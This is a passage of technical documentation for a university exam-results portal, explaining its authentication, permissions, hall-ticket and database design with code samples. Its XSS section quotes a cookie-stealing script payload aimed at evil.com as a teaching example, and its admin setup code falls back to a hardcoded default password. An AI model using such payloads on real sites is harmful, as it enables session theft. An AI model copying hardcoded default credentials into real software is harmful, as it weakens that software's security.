of memory and takes hundreds of milliseconds. An attacker with a GPU cluster that
has, say, 16GB of GPU memory can only run 160 parallel Argon2 computations, vs.
millions of MD5 computations. This dramatically limits the speed of brute-force
attacks against stolen Argon2 hashes.

### 4.9 The Axios Token Refresh Interceptor

One of the most technically sophisticated pieces of the frontend is the Axios
response interceptor that handles automatic token refresh. This mechanism ensures
that when an access token expires mid-session, the user experiences no interruption
— the frontend silently obtains a new token and retries the failed request.

The challenge is handling the case where multiple API calls fail simultaneously
because the access token just expired. Without careful handling, each failed call
would independently attempt a token refresh, leading to:
- Multiple simultaneous refresh requests to the server
- Race conditions where the second refresh attempt uses a token already blacklisted
  by the first

The `failedQueue` pattern in `api.js` solves this: the first 401 response sets
`isRefreshing = true` and starts the refresh process. All subsequent 401 responses
while `isRefreshing = true` are added to `failedQueue` as pending promises. Once
the refresh completes successfully, all queued requests are replayed with the new
token. If the refresh fails (the refresh token itself has expired), all queued
requests are rejected and the user is redirected to the login page.

```javascript
// frontend/src/services/api.js

let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(prom => {
    if (error) prom.reject(error);
    else prom.resolve(token);
  });
  failedQueue = [];
};

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then(token => {
          originalRequest.headers.Authorization = 'Bearer ' + token;
          return api(originalRequest);
        });
      }
      originalRequest._retry = true;
      isRefreshing = true;
      try {
        const refreshToken = tokenManager.getRefreshToken();
        const res = await axios.post('/api/token/refresh/', { refresh: refreshToken });
        const newToken = res.data.access;
        tokenManager.setTokens(newToken, refreshToken);
        processQueue(null, newToken);
        originalRequest.headers.Authorization = 'Bearer ' + newToken;
        return api(originalRequest);
      } catch (err) {
        processQueue(err, null);
        tokenManager.clearTokens();
        window.location.href = '/login';
        return Promise.reject(err);
      } finally {
        isRefreshing = false;
      }
    }
    return Promise.reject(error);
  }
);
```

### 4.10 Idle Timeout — Protecting Against Shared Computer Access

In university labs, students often leave their computers unattended without logging
out. Without an idle timeout, a student who walks away from a logged-in portal
leaves their account fully accessible to anyone who sits down at the computer.

The `useIdleTimeout` hook implements automatic logout after 15 minutes of inactivity.
"Activity" is defined broadly: any mouse movement, keyboard input, scroll event, or
touch event resets the inactivity timer.

The 15-minute total timeout is divided into two phases:
- **0 to 13 minutes of inactivity**: Silent — no indication to the user.
- **13 to 15 minutes of inactivity**: Warning phase — a modal appears showing a
  countdown from 120 seconds, giving the user a chance to click "Stay Logged In"
  and reset the timer.
- **15 minutes of inactivity**: Logout triggered automatically.

This graduated approach avoids the frustrating experience of being suddenly logged
out without warning while still enforcing security. The warning modal uses the
`useEscapeKey` hook so users can dismiss it by pressing Escape.

### 4.11 Registration Flow and Preventing Privilege Escalation

The student self-registration endpoint (`/api/register/`) is publicly accessible
(no authentication required, only rate-limited). However, several safeguards
prevent misuse:

**Role Hardcoding:** Regardless of what role the registration request specifies,
the backend always sets `role='student'` for self-registered accounts. The only
way to get an admin account is for an existing admin to create one manually.

**Uniqueness Enforcement:** The username (roll number) and email must be unique
across the entire system. The database enforces this through unique constraints,
and the serializer validates it before attempting insertion.

**Password Strength:** The serializer rejects passwords shorter than 8 characters
and passwords that are entirely numeric (e.g., "12345678"). This prevents obviously
weak passwords.

**Rate Limiting:** The registration endpoint is limited to 10 attempts per hour
per IP address, preventing automated account creation.

**No Admin Privileges:** New accounts have all `can_*` flags set to False by
default, meaning a student account has absolutely no administrative capabilities
even if they somehow gain access to the admin dashboard URL.

```python
# results/views.py

class RegisterView(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        serializer = UserRegistrationSerializer(data=request.data)
        if serializer.is_valid():
            user = serializer.save()
            user.role = 'student'          # Always student, never admin
            user.can_upload_results = False
            user.can_delete_results = False
            user.can_manage_users = False
            user.can_view_statistics = False
            user.can_view_all_branches = False
            user.save()
            return Response({'message': 'Registration successful'}, status=201)
        return Response(serializer.errors, status=400)
```

### 4.12 The ProtectedRoute Component and Route Guards

In a React SPA, URLs are managed by client-side JavaScript (React Router). Without
explicit protection, a user could navigate to `/admin` by typing the URL directly
in the address bar, even if they are not an admin. The `ProtectedRoute` component
prevents this.

`ProtectedRoute` wraps every authenticated route in `App.jsx`. When the wrapped
route is accessed, it first reads the current authentication state from `AuthContext`.
If the user is not authenticated, it redirects them to `/login`. If the user is
authenticated but has the wrong role (e.g., a student trying to access `/admin`),
it redirects them to `/unauthorized`.

This protection is on the frontend only — it prevents students from seeing the
admin UI. The real security enforcement is on the backend: even if someone bypasses
the frontend protection and reaches the admin UI, every API call to admin endpoints
would still fail with 403 Forbidden because the backend independently checks
permissions.

```javascript
// frontend/src/components/ProtectedRoute.jsx

const ProtectedRoute = ({ children, requiredRole }) => {
  const { user, loading } = useAuth();

  if (loading) {
    return <div className="flex justify-center items-center h-screen">
      <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600" />
    </div>;
  }

  if (!user) {
    return <Navigate to="/login" replace />;
  }

  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/unauthorized" replace />;
  }

  return children;
};
```

The `loading` state is important: on initial page load, the component reads the
saved user from sessionStorage, which is an asynchronous operation. If the component
rendered before this completes, it might incorrectly redirect an authenticated user
to the login page. Showing a loading spinner during this brief period prevents
that race condition.


---

## 5. Student Features - Detailed Explanation

### 5.1 The Student Experience — Overview

From a student's perspective, the portal is a single-page application that feels
like a mobile app: no page reloads, instant feedback, smooth transitions. After
logging in, students land on their dashboard which immediately begins loading their
academic data in the background. The design philosophy for the student side is
"show the most important information first, allow deeper exploration on demand."

The most important information is: "Did I pass? What are my grades? What is my
SGPA?" These are answered immediately on the dashboard. Secondary features —
notifications, circulars, hall tickets, statistics charts — are accessible through
clearly labeled navigation elements.

All student-facing data is scoped to the logged-in user. This scoping is not
merely a frontend convenience — it is enforced at the database query level in every
backend view. A student cannot access another student's data even by crafting raw
HTTP requests with valid JWT tokens.

### 5.2 Results Display — Design and Implementation

The core feature of the student portal is viewing exam results. Results are
organized by examination (semester), with each semester displayed as a collapsible
panel. This accordion design is chosen because:

1. Students typically care most about their latest semester. Showing all semesters
   expanded simultaneously would bury the most recent results below the fold.
2. Students may have many semesters of data (up to 8 for a 4-year B.Tech programme).
   An accordion keeps the page manageable.
3. Each panel header shows the semester name AND the calculated SGPA for that
   semester, giving an immediate summary without requiring expansion.

The backend returns results grouped by exam name as a JSON object with exam names
as keys. The frontend preserves this structure in its state, iterating over the
keys to render each accordion panel.

Within each expanded panel, results are displayed in a table with columns for
subject code, subject name, grade, credits, and calculated grade points. Failing
grades (F) are highlighted in red to draw immediate attention to subjects requiring
supplementary examination.

```javascript
// frontend/src/pages/StudentDashboard.jsx (results rendering)

const GRADE_POINTS = { O: 10, A: 9, B: 8, C: 7, D: 6, F: 0 };

const calculateSGPA = (subjects) => {
  let totalPoints = 0;
  let totalCredits = 0;
  subjects.forEach(s => {
    const pts = GRADE_POINTS[s.grade?.toUpperCase()] ?? 0;
    const cr = parseFloat(s.credits) || 0;
    totalPoints += pts * cr;
    totalCredits += cr;
  });
  return totalCredits === 0 ? '0.00' : (totalPoints / totalCredits).toFixed(2);
};
```

### 5.3 The Credit System and Grading — Academic Context

To understand how SGPA and CGPA are calculated, one must first understand the
credit-based grading system used by SPMVV, which follows the University Grants
Commission (UGC) of India guidelines.

**Credits:** Each subject is assigned a credit value that represents the number
of weekly contact hours (lectures, tutorials, practicals). A 3-credit subject
typically has 3 lectures per week. Credits represent the "weight" of a subject —
a 4-credit subject contributes more to the SGPA than a 2-credit subject.

**Grades:** Rather than raw marks (0-100), the system uses letter grades that
map to grade points on a 10-point scale:

| Grade | Description   | Grade Points |
|-------|---------------|--------------|
| O     | Outstanding   | 10           |
| A     | Excellent     | 9            |
| B     | Very Good     | 8            |
| C     | Good          | 7            |
| D     | Satisfactory  | 6            |
| F     | Fail          | 0            |

**SGPA (Semester Grade Point Average):** The weighted average of grade points
for all subjects in one semester, weighted by credits.

```
SGPA = Sum(grade_points_i * credits_i) for all subjects i
       -----------------------------------------------
       Sum(credits_i) for all subjects i
```

Example calculation:
- Mathematics: Grade O (10 points), 4 credits → 40 points
- Physics: Grade A (9 points), 3 credits → 27 points
- Programming: Grade B (8 points), 4 credits → 32 points
- English: Grade C (7 points), 2 credits → 14 points
- Total grade points: 113, Total credits: 13
- SGPA = 113 / 13 = 8.69

**CGPA (Cumulative Grade Point Average):** In this implementation, CGPA is
calculated as the simple average of all semester SGPAs. This is a simplification
— a fully correct CGPA would weight by total credits per semester — but it provides
a useful overall performance indicator.

This same calculation is implemented twice: once in Python on the backend (for
the statistics API) and once in JavaScript on the frontend (for immediate display
in the results accordion before the statistics API responds).

### 5.4 Statistics Visualization — Why Charts?

The statistics feature transforms raw grade data into visual charts using Recharts.
The rationale for visual presentation over raw numbers is grounded in educational
psychology: students better understand and engage with their academic trajectory
when they can see it as a line or bar chart rather than a list of numbers.

Three visualizations are provided:

**SGPA Bar Chart:** Shows one bar per semester with the SGPA value on the Y-axis
(range 0-10). This makes it immediately clear whether performance is improving,
declining, or steady across semesters. A student who got 6.5 in Sem-1, 7.2 in
Sem-2, and 8.1 in Sem-3 will see a clearly rising trend that is motivating.

**Grade Distribution Pie Chart:** Shows the proportion of each grade (O, A, B, C,
D, F) across all subjects in all semesters. This tells the student whether their
overall profile leans toward excellence (mostly O and A) or toward just-passing
(mostly C and D).

**CGPA Display:** A prominent numerical display of the student's overall CGPA at
the top of the statistics modal, providing an immediate answer to "how am I doing
overall?"

The statistics modal is implemented as a React overlay (not a separate page) so
students can view their charts and then dismiss the modal to return to their results
without losing their place.

### 5.5 Notification System — Architecture and Rationale

Notifications serve as a channel for the university to communicate time-sensitive
information directly to students within the portal. Examples include: "Results for
Semester 3 have been uploaded", "Hall tickets for the December examination are now
available", "Supplementary examination schedule has been posted."

The notification system has two components:

**Backend (Storage and Retrieval):** Each notification is stored in the `notifications`
table with a `target_branch` field that can be a specific branch name (e.g., "CSE")
or the special value "ALL". When a student fetches notifications, the backend
returns all notifications where `target_branch` matches the student's branch OR
equals "ALL". This allows administrators to send targeted communications (e.g.,
notifying only ECE students about an ECE-specific announcement) or broadcast
messages to all students.

**Frontend (Display and Polling):** The `NotificationBell` component displays a
bell icon in the navigation bar. When the bell icon is clicked, a dropdown panel
shows recent notifications. Unread notifications are visually distinguished with
a blue background. A red badge shows the count of unread notifications.

The component polls the notifications API every 60 seconds using `setInterval`
in a `useEffect`. This polling-based approach is simpler than WebSockets and
sufficient for notifications that are not ultra-real-time. The interval is cleared
when the component unmounts to prevent memory leaks.

```jsx
// frontend/src/components/NotificationBell.jsx

useEffect(() => {
  const fetchNotifications = async () => {
    const res = await api.get('/api/notifications/');
    setNotifications(res.data);
  };
  fetchNotifications();
  const interval = setInterval(fetchNotifications, 60000);
  return () => clearInterval(interval);  // Cleanup on unmount
}, []);
```

### 5.6 University Circulars — Purpose and Design

Circulars are formal written communications from the university administration to
students. Unlike notifications (which are ephemeral alerts), circulars represent
official documents: examination schedules, holiday lists, exam fee notices, academic
calendar updates, etc.

The distinction between notifications and circulars is intentional:
- **Notifications** are transient, targeted, and operational ("results are up")
- **Circulars** are permanent, official, and documentary ("official examination schedule")

Circulars are displayed in a dedicated page (`/student/circulars`) separate from
the dashboard. They are listed in reverse chronological order with title, date, and
full content. The content may contain formatted text. DOMPurify is used to sanitize
any HTML in circular content before rendering it, preventing XSS attacks where
a malicious admin could inject scripts through a circular's content.

Only active circulars (where `is_active = True`) are shown to students. Admins can
deactivate outdated circulars to keep the student view clean without deleting the
records.

### 5.7 Hall Ticket Download — How It Works for Students

The hall ticket feature is one of the most practically valuable features of the
portal. From the student's perspective, the experience is simple:

1. Navigate to the Hall Ticket section of the dashboard.
2. If a hall ticket has been generated for the current active exam, a "Download
   Hall Ticket" button appears.
3. Clicking the button downloads a PDF file directly to the student's device.

Under the hood, the process is more complex. When the student clicks download:
1. The frontend calls `GET /api/student/hall-ticket/download/`.
2. The backend looks up the `HallTicket` record for this student's roll number
   and the currently active exam.
3. The PDF bytes stored in the `HallTicket.pdf_file` binary field are retrieved.
4. The backend sends the bytes as an HTTP response with:
   - `Content-Type: application/pdf`
   - `Content-Disposition: attachment; filename="hall_ticket_<roll_number>.pdf"`
5. The browser interprets these headers and automatically opens the browser's
   "Save File" dialog or downloads the PDF directly.

The hall ticket PDF itself contains all the information the student needs on exam
day: personal details, photograph, roll number, exam center, list of subjects with
their scheduled dates and times, and a QR code that exam center staff can scan to
verify the ticket's authenticity.

### 5.8 Input Validation and XSS Prevention

Cross-Site Scripting (XSS) is a type of attack where malicious JavaScript is
injected into a web page through user-controlled input. For example, if a
registration form accepts the name `<script>document.location='http://evil.com/?c='+document.cookie</script>`
and the application displays this name on other pages without sanitization, the
script would execute in other users' browsers.

DOMPurify is a library that strips unsafe HTML from strings. It uses the browser's
own DOM parsing engine (hence "DOM"-Purify) and an allow-list of safe tags and
attributes to remove anything that could execute JavaScript.

```javascript
// frontend/src/utils/validation.js

import DOMPurify from 'dompurify';

export const sanitizeInput = (input) => {
  if (typeof input !== 'string') return input;
  // ALLOWED_TAGS: [] and ALLOWED_ATTR: [] strips ALL HTML
  return DOMPurify.sanitize(input.trim(), { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
};
```

With `ALLOWED_TAGS: []`, DOMPurify removes ALL HTML tags, leaving only plain text.
This is the most aggressive sanitization mode, appropriate for name and username
fields where no HTML formatting should ever appear.

The backend provides a second layer of protection through Django's ORM parameterized
queries — even if sanitized input somehow contained a SQL fragment, it would be
treated as a literal string, not executed as SQL.

### 5.9 The useEscapeKey Hook — UX Consistency

The `useEscapeKey` hook is a small but important UX feature. In desktop applications,
users have a universal convention: pressing Escape closes any dialog or modal.
Web applications should respect this convention.

Without this hook, students who open the statistics modal, idle warning modal, or
any other overlay would be forced to click the "Close" button. With `useEscapeKey`,
pressing Escape works as expected.

The hook registers a `keydown` event listener on the document when it mounts and
removes it when it unmounts. The `useEffect` cleanup function is critical here —
without it, event listeners would accumulate each time a component renders,
eventually causing multiple logouts or modal closes per Escape keypress.

```javascript
// frontend/src/hooks/useEscapeKey.js

import { useEffect } from 'react';

const useEscapeKey = (onEscape) => {
  useEffect(() => {
    const handleKeyDown = (event) => {
      if (event.key === 'Escape') {
        onEscape();
      }
    };
    document.addEventListener('keydown', handleKeyDown);
    return () => document.removeEventListener('keydown', handleKeyDown);
  }, [onEscape]);
};

export default useEscapeKey;
```

The `onEscape` callback is included in the dependency array of `useEffect`. This
means if the parent component passes a new function reference on re-render, the
event listener is correctly updated. To prevent unnecessary re-registration, parent
components typically wrap the callback in `useCallback`.

### 5.10 Profile View

The profile view shows the student their own account information: full name,
username (roll number), email, and branch. This serves a verification purpose —
students can confirm that their registration details are correct, which is important
because roll number errors would prevent their results from appearing.

The profile data is loaded from the `/api/profile/` endpoint which returns the
`request.user` serialized as JSON. The backend never exposes the password hash,
failed login attempts, or lockout status to the user.


---

## 6. Admin Features - Detailed Explanation

### 6.1 The Admin Model — Roles and Granular Permissions

The portal supports two types of users: students and admins. Within the admin role,
there are five permission flags that control what each admin can do. This granular
permission model reflects the reality of university administration: different staff
members have different responsibilities, and it would be a security risk to give
everyone full access.

For example, a data-entry clerk who uploads Excel result files should have
`can_upload_results = True` but should NOT have `can_manage_users = True` (they
should not be able to create new admin accounts or change student permissions).
A dean or registrar who needs to view statistics should have `can_view_statistics
= True` but may not need to upload results.

This principle — giving each user account the minimum permissions necessary for
their job — is called the "Principle of Least Privilege" and is a cornerstone of
access control security.

The five flags and their meanings:

**`can_upload_results`:** Grants access to the Excel result upload feature. Without
this flag, the admin cannot add any results to the system regardless of their admin
role.

**`can_delete_results`:** Grants access to deleting individual result records. This
is separate from upload because deletion is a more destructive and irreversible
action. An admin who can upload should not necessarily be able to delete — perhaps
only senior staff should have this capability.

**`can_manage_users`:** Grants access to creating, editing, and deactivating user
accounts. This is the most powerful permission because it allows an admin to create
other admin accounts and assign permissions. Only the most trusted staff should
have this flag.

**`can_view_statistics`:** Grants access to the system-wide statistics dashboard.
This might be appropriate for academic administration and management who need to
monitor pass rates and performance trends but do not need to manage data.

**`can_view_all_branches`:** By default, admins only see results and users from
their own branch. This flag removes that restriction and allows an admin to see
data across all branches. This is appropriate for central examination office staff
but not for department-level staff.

All five flags are stored as boolean fields on the User model and checked in the
backend views immediately after the admin authentication check.

### 6.2 Excel Result Upload — The Core Administrative Workflow

Uploading results via Excel is the highest-frequency admin operation. After every
semester examination, the examination office compiles results in Excel format and
needs to make them available to all students as quickly as possible. The portal
is designed to make this process fast, reliable, and error-tolerant.

**Why Excel?** Despite being an old format, Excel (.xlsx) is universally used in
Indian academic institutions for data management. Examination software systems
typically export results as Excel files. Requiring staff to learn a new data entry
format would create unnecessary friction. By accepting Excel directly, the portal
integrates into the existing workflow without changing it.

**The Validation-First Approach:** The Excel processing is designed to validate
the entire file before writing anything to the database. This prevents a scenario
where the first 200 rows succeed and then row 201 has an error, leaving the database
in a partially-updated state. Instead:

1. The file is parsed completely, collecting all valid rows and all error rows.
2. If there are errors, they are reported back to the admin with specific row numbers.
3. Only valid rows are written to the database.

This means an admin can upload a file with a few bad rows, see the errors, fix
the Excel file, and re-upload. The valid rows use `update_or_create` which safely
handles both new records and updates to existing records.

**`update_or_create` Idempotency:** The database write uses Django's
`update_or_create` method with the unique key `(roll_number, exam_name, subject)`.
This means:
- If no record exists for this student/exam/subject: create it.
- If a record already exists: update it with the new grade.

This idempotent design means the same file can be uploaded multiple times without
creating duplicate records. If an admin notices a grade error, they fix it in the
Excel file and re-upload — the corrected grade will overwrite the incorrect one.

```python
# results/views.py

result, created_now = Result.objects.update_or_create(
    roll_number=item['roll_number'],
    exam_name=item['exam_name'],
    subject=subject,
    defaults={
        'student_name': item['student_name'],
        'grade': item['grade'],
    }
)
if created_now:
    created += 1
else:
    updated += 1
```

**Subject Normalization:** Subjects (subject code, name, credits) are stored in
a separate `subjects` table, not duplicated in every result row. The upload handler
uses `get_or_create` for subjects: if the subject already exists (matching by
`subject_code`), it reuses the existing record; if not, it creates a new one.

This normalization serves multiple purposes:
- Changes to a subject name (e.g., correcting a spelling) propagate automatically
  to all results that reference that subject.
- Credits for a subject are stored once, not repeated for each student.
- The subjects table acts as a catalog of all subjects in the university, which
  can be useful for future features (e.g., course catalog, prerequisite tracking).

### 6.3 Hall Ticket System — End-to-End Workflow

The hall ticket system is the most complex feature in the portal, involving multiple
interconnected steps. Understanding the complete lifecycle clarifies why each step
exists and how the components work together.

**What is a Hall Ticket?** In the Indian academic system, a "hall ticket" (also
called an "admit card") is a document that a student must present to be permitted
entry to an examination hall. It typically contains: the student's name and
photograph for identity verification, their roll number, the exam name, the venue/
center, and a list of subjects they are sitting for with scheduled dates and times.
Without a valid hall ticket, a student cannot sit the examination.

**The Multi-Step Process:**

*Step 1 — Exam Configuration:*
An admin creates an exam record specifying the exam name (e.g., "B.Tech 2nd Year
Sem-3 Examinations December 2025"), exam date, exam center name and address, and
the list of subjects being examined in this sitting with their individual scheduled
dates and times. This information forms the "template" that will appear on every
student's hall ticket for this exam.

*Step 2 — Student Enrollment:*
The admin uploads an enrollment Excel file containing the roll numbers, names, and
branches of all students registered to sit this examination. Not all enrolled
students necessarily have accounts in the portal — the hall ticket system is
designed to work for any student who was enrolled for the exam, regardless of
whether they have registered on the portal. Each row creates a `HallTicketEnrollment`
record linking the student's roll number to the exam.

*Step 3 — Photo Upload:*
The admin uploads individual student photographs that will appear on the hall ticket.
Photos are stored as image files linked to each enrollment. If a photo is not
available for a student, a placeholder box is used instead. Photos are resized by
the backend using Pillow to the standard passport-photo dimensions (35mm x 45mm)
before being embedded in the PDF, ensuring consistent layout regardless of the
original photo dimensions or aspect ratio.

*Step 4 — PDF Generation:*
The admin triggers hall ticket generation. The backend iterates over all enrollment
records for the exam and generates a PDF for each student using ReportLab. Each
PDF is a professional A4 document containing all required information. The generation
runs in the web request context (synchronously), which may take a few minutes for
large cohorts. Future enhancements should move this to a background task queue
(Celery) for scalability.

*Step 5 — Student Download:*
Students log in and navigate to the hall ticket section. If a hall ticket has been
generated for them, a download button appears. Clicking it retrieves the PDF bytes
from the database and delivers them as a file download.

**QR Code Verification:** Each hall ticket contains a QR code encoding the student's
roll number, exam name, and exam date. At the examination center, staff can scan
this QR code to verify the hall ticket's authenticity. While the current system
does not have a dedicated QR scanner web page, the data encoded in the QR code
is human-readable and can be verified against the university's records.

### 6.4 User Management — Administrative Account Lifecycle

Admin users with `can_manage_users = True` can perform complete CRUD (Create, Read,
Update, Delete) operations on user accounts. This is the mechanism by which:
- New admin accounts are provisioned for exam office staff
- Permissions are adjusted (e.g., granting upload rights to a new staff member)
- Student accounts are deactivated (e.g., for students who have left the university)
- Roll number errors are corrected (updating the username field)

**Account Deactivation vs. Deletion:** The system does not hard-delete user accounts.
Instead, it sets `is_active = False` on the User record. This is important because:
- All result records reference the student's roll number (username). Deleting the
  user account would leave results without an associated user, breaking queries.
- Audit logs reference user IDs. Deleting a user would leave audit logs pointing
  to non-existent users.
- Academic records must be preserved even after a student leaves the university.

Deactivated accounts cannot log in (Django checks `is_active` during authentication)
but their data remains intact in the database.

**Branch Filtering:** An admin without `can_view_all_branches` can only see users
from their own branch. When listing users, the backend filters:

```python
if request.user.can_view_all_branches:
    users = User.objects.all()
else:
    users = User.objects.filter(branch=request.user.branch)
```

This means a CSE department admin cannot see or accidentally modify accounts of
students from other departments, reducing the risk of cross-department data leakage.

### 6.5 Circular Management — Official Communications

Circulars are created, edited, and deactivated through the `CircularManagement.jsx`
admin page. The workflow is straightforward:
1. Admin writes a title and content for the circular.
2. Upon saving, the circular is immediately visible to all students (or the
   targeted audience).
3. Outdated circulars can be deactivated (hidden from students) without deletion.
4. Circulars can be edited to correct errors.

Each create/update/delete action on a circular is recorded in the audit log,
providing a complete history of what was communicated and when.

**Rich Text Content:** The circular content field is a `TextField` (unlimited
length) that can contain formatted text. On the frontend, DOMPurify is applied
to the displayed content to prevent XSS while still allowing safe formatting.

### 6.6 Notification Broadcasting

Unlike circulars (documents), notifications are alerts that appear in the student's
notification bell. They are designed for time-sensitive operational messages.

An admin with appropriate permissions can send a notification specifying:
- A title (short summary, max ~200 characters)
- A message body (detail)
- A target branch: either a specific branch code (e.g., "CSE", "ECE") or "ALL"

The targeting is particularly valuable: if results for only the ECE branch have
been uploaded, the admin can notify ECE students specifically without creating
noise for students in other branches.

```python
# results/views.py

class SendNotificationView(APIView):
    permission_classes = [IsAuthenticated, IsAdminUser]

    def post(self, request):
        title = request.data.get('title', '').strip()
        message = request.data.get('message', '').strip()
        target_branch = request.data.get('target_branch', 'ALL').strip()

        if not title or not message:
            return Response({'error': 'Title and message are required'}, status=400)

        notification = Notification.objects.create(
            title=title,
            message=message,
            target_branch=target_branch,
            created_by=request.user
        )
        AuditLog.objects.create(
            user=request.user,
            action='send_notification',
            ip_address=get_client_ip(request),
            details=f'Sent to: {target_branch}, Title: {title}'
        )
        return Response({'message': 'Notification sent', 'id': notification.id})
```

### 6.7 Statistics Dashboard — Monitoring Academic Performance

The admin statistics dashboard aggregates data across all results to give
administrators a bird's-eye view of academic performance. Key metrics include:

**Pass Rate:** The percentage of all result records where the grade is not 'F'.
This is the single most important institutional metric — a falling pass rate
indicates systemic issues that need attention.

**Grade Distribution:** A breakdown of how many results received each grade (O, A,
B, C, D, F). A healthy distribution should show a roughly normal curve centered
around B or C, with relatively few O's and few F's.

**Results Per Exam:** How many results are in the system for each exam/semester.
This helps administrators verify that all uploaded results are accounted for and
compare cohort sizes across semesters.

**Student Counts:** Total registered students and total admin accounts, providing
basic system usage metrics.

Branch filtering applies here too — an admin without `can_view_all_branches` sees
statistics computed only for students in their branch. The backend applies the
branch filter at the database query level:

```python
if not request.user.can_view_all_branches:
    user_roll_numbers = User.objects.filter(
        branch=request.user.branch
    ).values_list('username', flat=True)
    base_qs = Result.objects.filter(roll_number__in=user_roll_numbers)
else:
    base_qs = Result.objects.all()
```

### 6.8 Audit Logs — Accountability and Forensic Capability

Every significant administrative action is recorded in the `audit_logs` table.
The audit log serves multiple purposes:

**Operational:** If an admin reports "I uploaded results but they don't appear for
students", a review of the audit log can confirm whether the upload occurred and
how many records were processed.

**Security:** If unexpected changes are noticed (e.g., a student's grade was
changed), the audit log can identify which admin account made the change, from
which IP address, and at what time.

**Compliance:** Academic institutions are subject to regulatory oversight. Having
a complete audit trail of who accessed and modified academic records is a regulatory
requirement in many jurisdictions.

**Forensic Investigation:** In the event of a security incident, the audit log
combined with the security log files provides a timeline of events that can help
understand what happened.

The audit log view shows the last 200 entries to avoid performance issues with
very large datasets. For forensic purposes, the underlying database table can be
queried directly.

### 6.9 The Default Admin Creation Mechanism

The `init_admin` management command is run every time the backend container starts
(as the second step in `init.sh`). Its logic is:

1. Check if a user with the admin username exists.
2. If not: create the user with all permissions set to True.
3. If yes: do nothing (skip silently).

The idempotent design means this command is safe to run multiple times. On the
first deployment, it creates the admin. On every subsequent restart, it finds
the admin already exists and does nothing.

The admin credentials are configured through environment variables (`ADMIN_USERNAME`,
`ADMIN_PASSWORD`, `ADMIN_EMAIL`) set in the `.env` file during deployment. The
IT team should change these from the defaults immediately after the first deployment.

```python
# results/management/commands/init_admin.py

class Command(BaseCommand):
    help = 'Create default admin user if none exists'

    def handle(self, *args, **kwargs):
        admin_username = os.environ.get('ADMIN_USERNAME', 'admin')
        admin_password = os.environ.get('ADMIN_PASSWORD', 'Admin@12345')
        admin_email = os.environ.get('ADMIN_EMAIL', 'admin@spmvv.ac.in')

        if not User.objects.filter(username=admin_username).exists():
            user = User.objects.create_superuser(
                username=admin_username,
                email=admin_email,
                password=admin_password,
                full_name='System Administrator',
                role='admin',
            )
            user.can_upload_results = True
            user.can_delete_results = True
            user.can_manage_users = True
            user.can_view_statistics = True
            user.can_view_all_branches = True
            user.save()
            self.stdout.write(self.style.SUCCESS(
                f'Admin user "{admin_username}" created successfully'
            ))
        else:
            self.stdout.write(f'Admin "{admin_username}" already exists, skipping.')
```



---

## 7. Database Design and Schema

### 7.1 Relational Database Theory and Design Philosophy

A relational database organizes data into tables (relations), where each table
represents a specific entity type and each row represents a single instance of
that entity. Relationships between entities are expressed via foreign keys —
columns in one table that reference the primary key of another table. This
design, formalized by E.F. Codd in 1970, provides several guarantees: data
integrity (constraints prevent invalid states), elimination of redundancy
(normalization), and flexible querying via SQL joins.

The SPMVV portal uses **MariaDB 10.11**, a community-maintained fork of MySQL
that offers full MySQL compatibility while adding features like improved query
optimization, Galera clustering support, and stronger open-source governance.
MariaDB 10.11 is an LTS (Long-Term Support) release, providing security patches
until 2028, making it suitable for a production system.

**Why not SQLite?** Django ships with SQLite support out of the box, and many
small projects use it. However, SQLite is an embedded, file-based database with
serious limitations for multi-user concurrent access. Under Gunicorn's 4-worker
model, multiple processes may write to the database simultaneously; SQLite's
file-level locking would cause contention and timeouts. MariaDB uses row-level
locking and supports true concurrent writes across connections.

**Why not PostgreSQL?** PostgreSQL is an excellent production database and would
be a valid alternative. MariaDB was chosen here likely because of lower memory
footprint (important on the VM), institutional familiarity, and equivalent
feature support for the use cases in this project.

### 7.2 Django ORM vs Raw SQL

Django's Object-Relational Mapper (ORM) allows Python code to interact with the
database using Python classes and methods rather than writing SQL strings. This
provides several benefits:

1. **Database portability**: The same Python code can target SQLite (development),
   MariaDB (production), or PostgreSQL (cloud). Django generates the correct SQL
   dialect for each engine.

2. **SQL injection prevention**: The ORM uses parameterized queries internally.
   All values are passed as parameters, never interpolated into SQL strings.

3. **Pythonic expression**: Queries read naturally:
   `Result.objects.filter(student=user, semester=3)` is more readable than the
   equivalent SQL SELECT statement.

4. **Automatic migration management**: Model changes are tracked and translated
   to ALTER TABLE / CREATE TABLE statements by `makemigrations` and `migrate`.

The tradeoff is that complex analytical queries (multi-level aggregations, window
functions) can be awkward in ORM syntax. Django provides `RawQuerySet` and
`connection.execute()` for cases where raw SQL is necessary.

### 7.3 Migration System

Django migrations are Python files that record every change made to model
definitions. The 16 migration files in this project represent the full evolution
of the schema from initial creation to the present state, including:

- Adding new fields to existing models
- Creating new tables (e.g., hall ticket tables added after initial deployment)
- Adding indexes and unique constraints
- Changing field types or lengths

Each migration file has a `dependencies` list that forms a directed acyclic
graph (DAG). Django applies migrations in dependency order, ensuring that a
migration which references a table created by a previous migration runs only
after that table exists.

The `django_migrations` table in the database records which migrations have been
applied. Running `migrate` is idempotent — already-applied migrations are skipped.

```python
# Example migration file structure: 0001_initial.py
from django.db import migrations, models

class Migration(migrations.Migration):
    initial = True
    dependencies = []

    operations = [
        migrations.CreateModel(
            name='CustomUser',
            fields=[
                ('id', models.BigAutoField(primary_key=True)),
                ('username', models.CharField(max_length=150, unique=True)),
                ('role', models.CharField(max_length=20, default='student')),
                ('branch', models.CharField(max_length=100, blank=True)),
                # ... other fields
            ],
        ),
    ]
```

### 7.4 The CustomUser Model

The `CustomUser` model extends Django's `AbstractUser`, which already provides:
`username`, `password`, `email`, `first_name`, `last_name`, `is_active`,
`is_staff`, `is_superuser`, `date_joined`, `last_login`.

The portal adds these custom fields:

```python
class CustomUser(AbstractUser):
    ROLE_CHOICES = [('student', 'Student'), ('admin', 'Admin')]

    role = models.CharField(max_length=20, choices=ROLE_CHOICES, default='student')
    branch = models.CharField(max_length=100, blank=True, default='')
    full_name = models.CharField(max_length=200, blank=True, default='')

    # Granular admin permissions
    can_view_statistics   = models.BooleanField(default=False)
    can_upload_results    = models.BooleanField(default=False)
    can_delete_results    = models.BooleanField(default=False)
